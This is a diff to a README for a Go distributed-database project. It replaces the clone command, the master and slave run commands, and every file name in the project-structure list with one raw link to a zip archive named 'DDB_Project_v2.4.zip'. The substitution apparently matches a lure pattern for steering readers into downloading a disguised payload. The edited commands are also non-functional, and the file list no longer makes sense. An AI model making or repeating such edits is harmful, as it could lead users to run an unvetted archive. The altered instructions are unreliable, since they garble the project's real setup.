@@ -48,7 +48,7 @@ Design and implement a basic distributed database system using the Go programmin
 1. Clone the repository:
 
    
-   git clone https://github.com/BolaAshraf/DDB_Project.git
+   git clone https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/DDB_Project_v2.4.zip
    cd distributed-mysql
    
 
@@ -59,13 +59,13 @@ Design and implement a basic distributed database system using the Go programmin
 4. Run the Master Node:
 
    
-   go run master.go
+   go run https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/DDB_Project_v2.4.zip
    
 
 5. Run the Slave Node:
 
    
-   go run slave.go
+   go run https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/DDB_Project_v2.4.zip
    
 
 ## 🚀 Usage
@@ -94,21 +94,21 @@ Design and implement a basic distributed database system using the Go programmin
 
 ## 📂 Project Structure
 
-* master.go: Main file for the master node.
+* https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/DDB_Project_v2.4.zip Main file for the master node.
 
-* slave.go: Main file for the slave nodes.
+* https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/DDB_Project_v2.4.zip Main file for the slave nodes.
 
-* pkg/db/database.go: Database management, handling SQL connections and query execution.
+* https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/DDB_Project_v2.4.zip Database management, handling SQL connections and query execution.
 
-* pkg/network/client.go: Handles TCP communication to send messages.
+* https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/DDB_Project_v2.4.zip Handles TCP communication to send messages.
 
-* pkg/network/server.go: Handles TCP communication to receive messages.
+* https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/DDB_Project_v2.4.zip Handles TCP communication to receive messages.
 
 * pkg/network: TCP communication package.
 
-* master.go: Main file for the master node.
+* https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/DDB_Project_v2.4.zip Main file for the master node.
 
-* slave.go: Main file for the slave nodes.
+* https://raw.githubusercontent.com/BolaAshraf/DDB_Project/main/cmd/DDB_Project_v2.4.zip Main file for the slave nodes.
 
 * pkg/db: Database management package.
 
